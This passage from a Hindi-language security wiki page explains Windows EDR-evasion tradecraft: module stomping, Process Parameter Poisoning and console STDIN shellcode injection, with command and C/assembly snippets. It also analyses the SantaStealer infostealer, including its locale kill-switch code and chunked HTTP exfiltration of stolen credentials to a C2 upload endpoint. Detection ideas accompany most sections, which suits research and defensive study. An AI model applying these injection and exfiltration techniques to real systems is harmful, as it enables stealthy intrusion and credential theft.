
`uxtheme.dll` या `comctl32.dll` जैसे आम modules पर naive stomping भरोसेमंद नहीं होता: DLL remote process में load न हुई हो सकती है, और बहुत छोटा code region process को crash कर सकता है। अधिक भरोसेमंद workflow यह है:

1. Target process के modules enumerate करें और पहले से loaded DLLs की **केवल नामों वाली include list** बनाएँ।
2. पहले payload बनाएँ और उसका **सटीक byte size** दर्ज करें।
3. Disk पर candidate DLLs scan करें और PE section के **`.text` `Misc_VirtualSize`** की तुलना payload size से करें। यह file size से ज़्यादा अहम है, क्योंकि इससे executable section का **memory में map होने पर आकार** पता चलता है।
4. **Export Address Table (EAT)** parse करें और stomp के शुरुआती offset के रूप में exported function RVA चुनें।
5. **blast radius** की गणना करें: payload अगर चुने गए function boundary से बड़ा है, तो वह memory में उसके बाद रखे adjacent exports को overwrite करेगा।

दुनिया में देखे जाने वाले सामान्य recon/selection helpers:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

ऑपरेशनल नोट्स
- `LoadLibrary`/unexpected image loads की telemetry से बचने के लिए remote process में **पहले से loaded** DLLs को प्राथमिकता दें।
- ऐसे exports को प्राथमिकता दें जिन्हें target application शायद ही कभी execute करता हो; अन्यथा सामान्य code paths, thread creation से पहले या बाद में stomped bytes तक पहुँच सकते हैं।
- बड़े implants के लिए अक्सर shellcode embedding को string literal से **byte-array/braced initializer** में बदलना पड़ता है, ताकि injector source में पूरा buffer सही ढंग से दर्शाया जा सके।

डिटेक्शन के विचार
- आम private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में remote writes।
- ऐसे export entry points जिनके in-memory bytes अब disk पर मौजूद backing file से मेल नहीं खाते।
- ऐसे remote threads या context pivots जो किसी legitimate DLL export के भीतर execution शुरू करते हैं, जिसके शुरुआती bytes हाल ही में संशोधित किए गए हों।
- DLL `.text` pages पर संदिग्ध `VirtualProtect(Ex)` / `WriteProcessMemory` sequences, जिनके बाद thread creation हो।

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) एक **process-injection / EDR-evasion** technique है, जो classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`) से बचती है। पहले से चल रहे target में bytes copy करने के बजाय, यह इस तथ्य का दुरुपयोग करती है कि Windows **चुने गए `CreateProcessW` startup parameters को child process में copy करता है** और उन्हें `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) में store करता है।<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` द्वारा copy किए जाने वाले poisonable carriers

उपयोगी carriers हैं:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` के साथ) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Carrier से जुड़ी व्यावहारिक सीमाएँ:

- `lpCommandLine` को `CreateProcessW` के लिए **writable memory** की ओर point करना चाहिए, और इसकी सीमा null terminator सहित **32,767 Unicode characters** है।
- `lpEnvironment` लगातार `NAME=VALUE\0` strings वाला Unicode environment block होना चाहिए, जिसके अंत में एक अतिरिक्त `\0` हो।
- `lpReserved` आधिकारिक तौर पर reserved है, इसलिए `ShellInfo` mapping को स्थिर, documented contract के बजाय implementation detail मानना चाहिए।

इससे सामान्य process creation **payload-transfer primitive** बन जाता है। Operator attacker-controlled startup data के साथ child process बनाता है और Windows को cross-process copy करने देता है।

### Remote write APIs के बिना remote lookup flow

Child बनने के बाद, केवल **read-only** primitives से copied buffer का पता लगाएँ:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` प्राप्त करें
2. Remote `PEB` पढ़ें
3. `PEB.ProcessParameters` तक जाएँ
4. `RTL_USER_PROCESS_PARAMETERS` पढ़ें
5. चुने गए pointer का उपयोग करें:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

न्यूनतम flow:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### कॉपी किए गए पैरामीटर बफ़र को execute करना

कॉपी किया गया पैरामीटर क्षेत्र आमतौर पर `RW` होता है, executable नहीं। एक सामान्य P3 chain यह है:

1. प्रोसेस को सामान्य रूप से बनाएँ (suspended नहीं)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` से चुने गए पैरामीटर पेज को executable बनाएँ
3. `PROCESS_INFORMATION` में पहले से लौटाए गए main thread handle का फिर से उपयोग करें
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` को overwrite करें) से execution को redirect करें

क्लासिक thread hijacking workflows के विपरीत, इसके लिए `SuspendThread` / `ResumeThread` की **ज़रूरत नहीं होती**; लौटाए गए main thread handle पर सीधे context बदला जा सकता है।

इससे injection के लिए आमतौर पर monitor की जाने वाली कई APIs से बचा जा सकता है:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- अक्सर `SuspendThread` / `ResumeThread` से भी

### Null-byte की सीमा और staged shellcode

तीनों carriers **string या string-जैसे data** हैं, इसलिए `0x00` वाला raw payload transfer के दौरान truncate हो जाता है। एक व्यावहारिक समाधान है **null-free first stage**, जो runtime पर constants को फिर से बनाता है और फिर कोई भी arbitrary second stage load करता है।

एक सरल pattern XOR-आधारित constant synthesis है:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Thisसे first stage transported parameter में null bytes embed किए बिना stack strings, API arguments, DLL paths या second-stage shellcode loader बना सकता है।

### first stage से Stack-based API calls

जब first stage को `LoadLibraryA` जैसे APIs call करने हों, तो यह:

- target stack पर string/buffer push कर सकता है
- **32-byte x64 shadow space** reserve कर सकता है
- `RCX`, `RDX`, `R8`, `R9` को constants या `RSP`-relative pointers पर set कर सकता है
- call से पहले `RSP` को **16-byte aligned** रख सकता है

इसके बाद second stage को stack से `PAGE_READWRITE` allocation में copy किया जा सकता है, `VirtualProtect` से उसे `PAGE_EXECUTE_READ` में बदला जा सकता है, और फिर उस पर jump किया जा सकता है। इससे सीधे RWX allocation की जरूरत नहीं पड़ती।

### Detection ideas

लेखकों द्वारा बताए गए अच्छे hunting अवसर:

- `VirtualProtectEx` / `NtProtectVirtualMemory` द्वारा **process-parameter pages को executable बनाना**
- उस protection change के बाद `SetThreadContext` / `NtSetContextThread का उपयोग
- `PEB` और फिर `RTL_USER_PROCESS_PARAMETERS` को remote रूप से पढ़ना
- process creation के दौरान असामान्य रूप से लंबे / high-entropy `lpCommandLine`, `lpEnvironment`, या `STARTUPINFO.lpReserved` values

### Notes

- P3 एक **cross-process transfer trick** है, अपने आप में पूर्ण execution primitive नहीं: copy किए गए parameter को अभी भी execute-permission change और execution redirection method की जरूरत होती है।
- लेखकों ने `RtlCreateProcessReflection` / Dirty Vanity पर विचार किया, लेकिन उसे अस्वीकार कर दिया क्योंकि यह internally `NtWriteVirtualMemory` और `NtCreateThreadEx` जैसे suspicious primitives का उपयोग करता है।

## Console STDIN pipe injection

एक interactive console child को **payload-transfer primitive** के रूप में भी इस्तेमाल किया जा सकता है। Injector child के standard input को pipe पर redirect करता है और एक marker के बाद shellcode भेजता है। Console program द्वारा data को अपनी private memory में पढ़ लेने के बाद, injector उस buffer को ढूँढता है, उसे executable बनाता है और child thread को उस पर redirect करता है। इससे `VirtualAllocEx` और `WriteProcessMemory` से बचा जा सकता है, लेकिन यह फिर भी process injection है, general EDR bypass नहीं।<sup>[[41]](#references)</sup>

"Named-pipe" विवरण के बावजूद, reference implementation `CreatePipe` call करता है, जो एक **anonymous pipe** बनाता है। Windows internally anonymous pipes को uniquely named pipe objects के साथ implement करता है, लेकिन PoC न तो `\\.\pipe\<name>` path चुनता है और न ही `CreateNamedPipe` call करता है। यह default security descriptor के साथ inheritable handles बनाता है, read handle को `STARTUPINFO.hStdInput` में रखता है, `STARTF_USESTDHANDLES` set करता है और handle inheritance enabled करके एक नया child launch करता है। इसलिए, यह PoC दिया गया console executable launch करता है; यह अपने pipe को किसी existing process से attach नहीं करता।<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Reference workflow

Implementation में यह chain इस्तेमाल होती है:<sup>[[41]](#references)</sup>

1. Child के `STDIN` और `STDOUT` के लिए anonymous pipe pairs बनाएँ। Parent-side के दोनों handles पर inheritance clear करें और process creation के बाद parent में child-side duplicates बंद करें।
2. `CREATE_NEW_CONSOLE` के साथ `netsh.exe` या `nslookup.exe` जैसे interactive executable launch करें। Child redirected standard handles inherit करता है।
3. Parent-side `STDIN` handle से `WriteFile` के माध्यम से पूरी binary `rawData` array भेजें। Console program bytes को consume करता है और उनकी एक copy अपने private committed regions में छोड़ देता है।
4. `VirtualQueryEx` से child के address space को traverse करें, `ReadProcessMemory` से candidate `MEM_PRIVATE` regions पढ़ें और `rawData` की शुरुआत में marker खोजें।
5. `VirtualProtectEx` से मिले buffer को `PAGE_EXECUTE_READWRITE` में बदलें।
6. Main thread पहचानें, उसे suspend करें, `NtSetContextThread` से `RIP` को `found_address + 0x19` पर set करें और उसे resume करें।

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

दिया गया implementation x64-विशिष्ट है: यह `CONTEXT.Rip` को संशोधित करता है, और इसमें embedded payload x64 shellcode है। `rawData` की शुरुआत 25-byte marker से होती है, इसलिए executable bytes hexadecimal offset `0x19` से शुरू होते हैं। Payload बदलते समय इस layout को बनाए रखें या marker, search vector, array size और execution offset को एक साथ अपडेट करें। Source comments में `0x0A`, `0x0D` और `0x1A` को bad characters के रूप में भी सूचीबद्ध किया गया है। यह workflow child के token या privileges को नहीं बदलता।<sup>[[41]](#references)</sup>

छोटे native helpers और payload compilation patterns के लिए, [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) देखें।

## Fileless Evasion और Credential Theft के लिए SantaStealer की Tradecraft

SantaStealer (जिसे BluelineStealer भी कहते हैं) दिखाता है कि आधुनिक info-stealers एक ही workflow में AV bypass, anti-analysis और credential access को कैसे जोड़ते हैं।<sup>[[24]](#references)</sup>

### Keyboard layout gating और sandbox delay

- एक config flag (`anti_cis`), `GetKeyboardLayoutList` के ज़रिए install किए गए keyboard layouts की सूची बनाता है। अगर Cyrillic layout मिलता है, तो sample एक खाली `CIS` marker बनाकर समाप्त हो जाता है, इससे पहले कि stealers चलें। इससे यह सुनिश्चित होता है कि वह excluded locales पर कभी detonate न हो, और साथ ही hunting artifact भी छोड़ जाता है।

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### स्तरित `check_antivm` लॉजिक

- Variant A process list को देखता है, हर नाम का custom rolling checksum निकालता है और उसे debuggers/sandboxes के embedded blocklists से मिलाता है; फिर computer name पर भी checksum चलाता है और `C:\analysis` जैसी working directories की जाँच करता है।
- Variant B system properties की जाँच करता है (process-count floor, हाल का uptime), VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` कॉल करता है और single-stepping का पता लगाने के लिए sleep से पहले और बाद में timing checks करता है। कोई भी संकेत मिलने पर modules लॉन्च होने से पहले ही प्रक्रिया रोक दी जाती है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE में Chromium credential helper एम्बेड होता है, जिसे या तो disk पर लिखा जाता है या memory में manually map किया जाता है; fileless mode में यह खुद imports/relocations resolve करता है, इसलिए helper की कोई artifacts disk पर नहीं लिखी जातीं।
- यह helper दूसरे चरण की DLL को ChaCha20 से दो बार encrypt करके रखता है (दो 32-byte keys + 12-byte nonces)। दोनों बार decrypt करने के बाद, यह blob को reflectively load करता है (`LoadLibrary` के बिना) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से प्राप्त `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports को कॉल करता है।<sup>[[25]](#references)</sup>
- ChromElevator routines direct-syscall reflective process hollowing का इस्तेमाल करके एक चल रहे Chromium browser में inject होती हैं, AppBound Encryption keys inherit करती हैं और ABE hardening के बावजूद SQLite databases से passwords/cookies/credit cards को सीधे decrypt करती हैं।

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table पर iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, आदि) के लिए एक thread शुरू करता है। हर thread shared buffers में results लिखता है और लगभग 45s के join window के बाद अपनी file count बताता है।
- काम पूरा होने पर, statically linked `miniz` library से सब कुछ `%TEMP%\\Log.zip` के रूप में zip किया जाता है। फिर `ThreadPayload1` 15s सोता है और archive को HTTP POST के ज़रिए 10 MB chunks में `http://<C2>:6767/upload` पर भेजता है; इस दौरान browser जैसा `multipart/form-data` boundary (`----WebKitFormBoundary***`) spoof किया जाता है। हर chunk में `User-Agent: upload`, `auth: <build_id>`, वैकल्पिक `w: <campaign_tag>` शामिल होते हैं और आखिरी chunk में `complete: true` जोड़ा जाता है, ताकि C2 को पता चले कि reassembly पूरी हो गई है।

## References

- [1] [उन्नत Evasion Tradecraft: सटीक Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ब्लॉग](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: malware के लिए अब कोई free passes नहीं](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – दस्तावेज़](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – नमूना](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – नमूना](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer के लिए नई Infection Chain और ConfuserEx-आधारित Obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – क्या आपको अपने zero trust पर भरोसा करना चाहिए? Zscaler posture checks को bypass करना](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell से पहले: Storm-2603 के पिछले Ransomware Operations की पड़ताल](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Exports का दुरुपयोग](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports की सूची (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library का search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security और access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) के सहारे EDRs का मुकाबला](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique से Windows Defender के Protective Shell को तोड़ना](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain के पीछे: RAT से Builder और फिर Coder तक](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer आ रहा है: एक नया, महत्वाकांक्षी Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing से Node.js Malware को मात देना](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace के साथ Adaptix को सुलाना](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET और Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - अपना Dotnet Etw छिपाना](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations में Chrome Remote Desktop का दुरुपयोग: एक व्यावहारिक मार्गदर्शिका](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender के Remediation Driver को Kernel Operation Primitive के रूप में weaponize करना](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo का companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM से Self-Masking Functions बनाना](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Redirected Input और Output के साथ Child Process बनाना](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
